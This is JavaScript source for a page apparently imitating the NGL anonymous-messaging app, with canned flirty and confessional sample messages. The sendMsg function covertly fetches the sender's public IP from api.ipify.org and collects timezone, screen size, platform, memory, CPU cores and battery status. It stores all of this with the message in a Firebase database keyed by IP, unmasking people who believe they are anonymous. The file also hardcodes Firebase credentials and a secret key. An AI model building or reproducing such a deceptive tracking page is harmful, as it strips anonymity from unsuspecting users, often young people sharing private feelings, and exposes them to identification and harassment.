import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
import { getDatabase, ref, set, get, push, child, update, remove, onChildAdded, onChildRemoved } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyA9czXS21ONXVxY2eGMS4GwMfR78IJE_Yc",
  authDomain: "secret-37491.firebaseapp.com",
  databaseURL: "https://secret-37491-default-rtdb.firebaseio.com",
  projectId: "secret-37491",
  storageBucket: "secret-37491.firebasestorage.app",
  messagingSenderId: "185262437707",
  appId: "1:185262437707:web:0ffe7c52e56f496e27a4ce",
  measurementId: "G-W19Q39DHFZ"
};
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const secretKey = "s3cr3tKey_9xPZ!w@VtL#2k7^QfJ8RbMh";
let topSecIn = document.getElementById("topSecIn");
let msgSentPage = document.getElementById("msgSentPage");
let sendAnotherMsg = document.getElementById("sendAnotherMsg");
let sendBtnIn = document.getElementById("sendBtnIn");
let sending = document.getElementById("sending");
let userMessage = document.getElementById("inputBox");
const baseMessages = [
  // Flirty
  "i lowkey have a crush on u fr 😳",
  "ur literally the cutest omg 😍",
  "been staring at ur pics tbh",
  "i wanna kiss u but shy ngl 😘",
  "how u always look so good tho? 🔥",

  // Funny / Chaotic
  "pineapple on pizza is a crime fr 🍍🍕",
  "do u dance in the shower? pls say yes 😂",
  "i once tripped in front of my crush lol",
  "do u think aliens watch us? 👽 idk",
  "if u were a meme, which one would u be?",

  // Confession / Shy / Insecure
  "i get nervous just texting u lol",
  "sometimes i feel like no one really gets me",
  "lowkey scared ur gonna ghost me tbh",
  "i was jealous when u talked to them :(",
  "idk if u like me back but i really hope so",

  // Bold / Direct
  "i think ur outta my league but imma try 😤",
  "why haven’t u asked me out yet? fr",
  "u gotta tell me ur secrets sometime",
  "can u stop being so perfect? it’s unfair",
  "let’s just admit we both wanna hang soon",

  // Natural + slang + chaotic style
  "ngl u make me wanna be better fr",
  "ikr this sounds crazy but i like u lol",
  "pls say u like me back or imma cry 😭",
  "u always on my mind no cap",
  "fr i’m kinda obsessed with u, not gonna lie"
];
    
function sendMessage(){
    module.backToHome = function backToHome(){
        document.title = "@1jwclx._";
        topSecIn.style.display = "flex";
        msgSentPage.style.display = "none";
        sendAnotherMsg.style.display = "none";
    }
    module.msgSent = function msgSent(){
        document.title = "NGL - Sent!";
        topSecIn.style.display = "none";
        msgSentPage.style.display = "flex";
        sendAnotherMsg.style.display = "flex";
    }
    module.generateRandom = function generateRandom(){
        const randomIndex = Math.floor(Math.random() * baseMessages.length);
        userMessage.value = baseMessages[randomIndex];
    }
    module.sendMsg = async function sendMsg() {
        var timeStamp = new Date().getTime();
        let currentDate = new Date().toISOString();
        let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        let screenSize = window.screen.width + ', ' + window.screen.height;
        let platform = navigator.platform + ', ' + navigator.appName + ', ' + navigator.appVersion;
        let deviceMemory = navigator.deviceMemory || 'Not supported';
        deviceMemory = `${deviceMemory} GB`;
        let cpuCores = navigator.hardwareConcurrency || 'Not supported';
        cpuCores = `${cpuCores}`;
        if ('getBattery' in navigator && typeof navigator.getBattery === 'function') {
            navigator.getBattery().then(function(battery) {
                sessionStorage.setItem('Battery', `${battery.level * 100}%` + ', ' + `${battery.charging ? "Charging: Yes" : "Charging: No"}`);
            });
        }
        let ip = '127.0.0.1';
        await fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            if (data && data.ip) {
            sessionStorage.setItem('IP', data.ip);
            ip = data.ip.replace(/\./g, ':');
            } else {
            sessionStorage.setItem('IP', '127.0.0.1');
            ip = '127.0.0.1';
            }
        })
        .catch(() => {
            sessionStorage.setItem('IP', '127.0.0.1');
            ip = '127.0.0.1';
        });
        let message = userMessage.value.trim();
        if (userMessage.value.trim().length !== 0) {
            set(ref(db, 'Messages/' + ip + '/' + timeStamp), {
                "Message": message,
                "Secret": secretKey
            }).then(() => {
                set(ref(db, 'Messages/' + ip + '/' + timeStamp + '/' + 'Related-Information'), {
                    IP: sessionStorage.getItem('IP'),
                    TIME: currentDate,
                    TIMEZONE: timeZone,
                    SCREENSIZE: screenSize,
                    PLATFORM: platform,
                    DEVICEMEMORY: deviceMemory,
                    CPUCORES: cpuCores,
                    BATTERY: sessionStorage.getItem('Battery')
                })
                module.msgSent();
                userMessage.value = "";
                sending.style.display = "none";
                sendBtnIn.style.display = "flex";
            });
            
        }else{
            userMessage.focus();
        }
    }
}
sendMessage();
